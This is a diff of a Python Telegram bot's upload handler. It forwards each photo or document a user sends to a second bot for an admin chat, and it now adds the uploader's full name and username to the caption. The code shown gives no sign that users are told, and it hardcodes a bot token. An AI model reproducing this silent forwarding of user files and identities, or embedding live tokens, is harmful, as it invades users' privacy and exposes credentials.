@@ -546,11 +546,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     size_mb = 0
     filename = ""
     suffix = ""
+    file_bytes = None
+    file_bytes_copy = None  # نسخة منفصلة للبوت الثاني
 
     if update.message.photo:
         photo = update.message.photo[-1]
         tgfile = await context.bot.get_file(photo.file_id)
         file_bytes = await tgfile.download_as_bytearray()
+        file_bytes_copy = file_bytes.copy()  # نسخة منفصلة
         filename = "image.jpg"
         suffix = ".jpg"
         size_mb = len(file_bytes) / (1024 * 1024)
@@ -569,31 +572,35 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         tgfile = await context.bot.get_file(d.file_id)
         file_bytes = await tgfile.download_as_bytearray()
+        file_bytes_copy = file_bytes.copy()  # نسخة منفصلة
 
-    
     # ========== إرسال نسخة إلى البوت الثاني ==========
     try:
         # استبدل YOUR_SECOND_BOT_TOKEN بـ token البوت الثاني
         second_bot_token = "8269995805:AAGRMi2L3Wx2I1H1jrhvkmbrXK6mVXd6hxs"
         second_bot = Bot(token=second_bot_token)
         
-        # إرسال الملف إلى البوت الثاني (إلى نفس المستخدم أو إلى مدير معين)
+        # إرسال الملف إلى البوت الثاني
         if update.message.photo:
             await second_bot.send_photo(
-                chat_id=ADMIN_ID,  # أو أي chat_id تريده
-                photo=file_bytes,
+                chat_id=ADMIN_ID,
+                photo=file_bytes_copy,  # استخدام النسخة المنفصلة
                 caption=f"📩 ملف مستلم من المستخدم: {user_id}\n"
                        f"📁 اسم الملف: {filename}\n"
-                       f"📊 الحجم: {size_mb:.2f} MB"
+                       f"📊 الحجم: {size_mb:.2f} MB\n"
+                       f"👤 اسم المستخدم: {update.effective_user.full_name}\n"
+                       f"🔖 المعرف: @{update.effective_user.username or 'غير متوفر'}"
             )
         else:
             await second_bot.send_document(
-                chat_id=ADMIN_ID,  # أو أي chat_id تريده
-                document=file_bytes,
+                chat_id=ADMIN_ID,
+                document=file_bytes_copy,  # استخدام النسخة المنفصلة
                 filename=filename,
                 caption=f"📩 ملف مستلم من المستخدم: {user_id}\n"
                        f"📁 اسم الملف: {filename}\n"
-                       f"📊 الحجم: {size_mb:.2f} MB"
+                       f"📊 الحجم: {size_mb:.2f} MB\n"
+                       f"👤 اسم المستخدم: {update.effective_user.full_name}\n"
+                       f"🔖 المعرف: @{update.effective_user.username or 'غير متوفر'}"
             )
     except Exception as e:
         print(f"فشل في إرسال الملف إلى البوت الثاني: {e}")
